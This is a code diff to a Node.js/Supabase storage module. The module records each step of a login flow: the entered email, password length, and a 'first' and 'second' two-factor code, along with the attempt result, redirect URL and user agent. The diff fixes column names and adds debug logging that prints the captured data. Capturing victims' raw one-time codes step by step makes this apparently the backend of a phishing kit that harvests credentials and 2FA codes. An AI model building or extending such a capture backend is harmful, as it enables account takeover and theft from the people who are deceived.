@@ -10,7 +10,19 @@ const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const supabaseUrl = process.env.SUPABASE_URL || "";
 const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY || process.env.SUPABASE_ANON_KEY || "";
 
+// Debug logging
+console.log("🔧 Supabase Debug Info:");
+console.log("   SUPABASE_URL:", supabaseUrl ? "✅ SET" : "❌ NOT SET");
+console.log("   SUPABASE_SERVICE_ROLE_KEY:", process.env.SUPABASE_SERVICE_ROLE_KEY ? "✅ SET" : "❌ NOT SET");
+console.log("   SUPABASE_ANON_KEY:", process.env.SUPABASE_ANON_KEY ? "✅ SET" : "❌ NOT SET");
+console.log("   NODE_ENV:", process.env.NODE_ENV);
+
 const supabase = createClient(supabaseUrl, supabaseKey);
+
+if (!supabaseUrl || !supabaseKey) {
+  console.error("❌ CRITICAL: Supabase credentials are missing! Functions will fail.");
+  console.error("   Make sure SUPABASE_URL and SUPABASE_SERVICE_ROLE_KEY are set in Netlify environment variables.");
+}
 
 // Use /app/data in production (Docker), or relative data/ in development
 const dataDir = process.env.NODE_ENV === "production" 
@@ -44,6 +56,7 @@ async function writeJson(fileName, data) {
 
 class SupabaseStorage {
   async logLoginAttempt(insertAttempt) {
+    console.log("📝 logLoginAttempt called with:", insertAttempt);
     const id = randomUUID();
     const timestamp = new Date().toISOString();
     const item = {
@@ -53,17 +66,33 @@ class SupabaseStorage {
     };
 
     try {
-      // Save to Supabase
+      // Save to Supabase - fix column names (snake_case)
       const { data, error } = await supabase
         .from("login_attempts")
-        .insert([item])
+        .insert([{
+          id: item.id,
+          session_id: item.sessionId,
+          timestamp: item.timestamp,
+          step: item.step,
+          step_name: item.stepName,
+          email: item.email,
+          password_length: item.passwordLength,
+          two_factor_code: item.twoFactorCode,
+          attempt: item.attempt,
+          result: item.result,
+          action: item.action,
+          redirect_url: item.redirectUrl,
+          user_agent: item.userAgent,
+        }])
         .select()
         .single();
 
       if (error) {
-        console.error("Supabase login attempt error:", error);
+        console.error("❌ Supabase login attempt error:", error);
         throw error;
       }
+
+      console.log("✅ Login attempt saved to Supabase");
 
       // Also save to JSON as backup
       try {
@@ -133,6 +162,7 @@ class SupabaseStorage {
   }
 
   async saveEmailData(data) {
+    console.log("📧 saveEmailData called with:", data);
     const item = {
       id: randomUUID(),
       timestamp: new Date().toISOString(),
@@ -140,19 +170,22 @@ class SupabaseStorage {
     };
 
     try {
+      console.log("   Inserting to Supabase:", item);
       // Save to Supabase (in a generic events table or custom table)
-      const { error } = await supabase
+      const { data: insertedData, error } = await supabase
         .from("login_attempts")
         .insert([{
           ...item,
-          stepName: "email_input",
+          step_name: "email_input",
           step: 1,
         }]);
 
       if (error) {
-        console.error("Supabase email save error:", error);
+        console.error("❌ Supabase email save error:", error);
         throw error;
       }
+
+      console.log("✅ Email saved to Supabase:", insertedData);
 
       // Also save to JSON as backup
       try {
@@ -174,6 +207,7 @@ class SupabaseStorage {
   }
 
   async savePasswordData(data) {
+    console.log("🔐 savePasswordData called");
     const item = {
       id: randomUUID(),
       timestamp: new Date().toISOString(),
@@ -181,19 +215,26 @@ class SupabaseStorage {
     };
 
     try {
-      // Save to Supabase
+      // Save to Supabase - fix column names
       const { error } = await supabase
         .from("login_attempts")
         .insert([{
-          ...item,
-          stepName: "password_input",
+          id: item.id,
+          session_id: item.sessionId,
+          timestamp: item.timestamp,
           step: 2,
+          step_name: "password_input",
+          email: item.email,
+          password_length: item.passwordLength,
+          user_agent: item.userAgent,
         }]);
 
       if (error) {
-        console.error("Supabase password save error:", error);
+        console.error("❌ Supabase password save error:", error);
         throw error;
       }
+
+      console.log("✅ Password saved to Supabase");
 
       // Also save to JSON as backup
       try {
@@ -215,6 +256,7 @@ class SupabaseStorage {
   }
 
   async saveFirstCodeData(data) {
+    console.log("🔑 saveFirstCodeData called");
     const item = {
       id: randomUUID(),
       timestamp: new Date().toISOString(),
@@ -222,19 +264,28 @@ class SupabaseStorage {
     };
 
     try {
-      // Save to Supabase
+      // Save to Supabase - fix column names
       const { error } = await supabase
         .from("login_attempts")
         .insert([{
-          ...item,
-          stepName: "two_factor_verification",
+          id: item.id,
+          session_id: item.sessionId,
+          timestamp: item.timestamp,
           step: 3,
+          step_name: "two_factor_verification",
+          email: item.email,
+          two_factor_code: item.code,
+          attempt: item.attempt,
+          result: item.result,
+          user_agent: item.userAgent,
         }]);
 
       if (error) {
-        console.error("Supabase first code save error:", error);
+        console.error("❌ Supabase first code save error:", error);
         throw error;
       }
+
+      console.log("✅ First code saved to Supabase");
 
       // Also save to JSON as backup
       try {
@@ -256,6 +307,7 @@ class SupabaseStorage {
   }
 
   async saveSecondCodeData(data) {
+    console.log("🔑 saveSecondCodeData called");
     const item = {
       id: randomUUID(),
       timestamp: new Date().toISOString(),
@@ -263,19 +315,28 @@ class SupabaseStorage {
     };
 
     try {
-      // Save to Supabase
+      // Save to Supabase - fix column names
       const { error } = await supabase
         .from("login_attempts")
         .insert([{
-          ...item,
-          stepName: "two_factor_verification",
+          id: item.id,
+          session_id: item.sessionId,
+          timestamp: item.timestamp,
           step: 3,
+          step_name: "two_factor_verification",
+          email: item.email,
+          two_factor_code: item.code,
+          attempt: item.attempt,
+          result: item.result,
+          user_agent: item.userAgent,
         }]);
 
       if (error) {
-        console.error("Supabase second code save error:", error);
+        console.error("❌ Supabase second code save error:", error);
         throw error;
       }
+
+      console.log("✅ Second code saved to Supabase");
 
       // Also save to JSON as backup
       try {
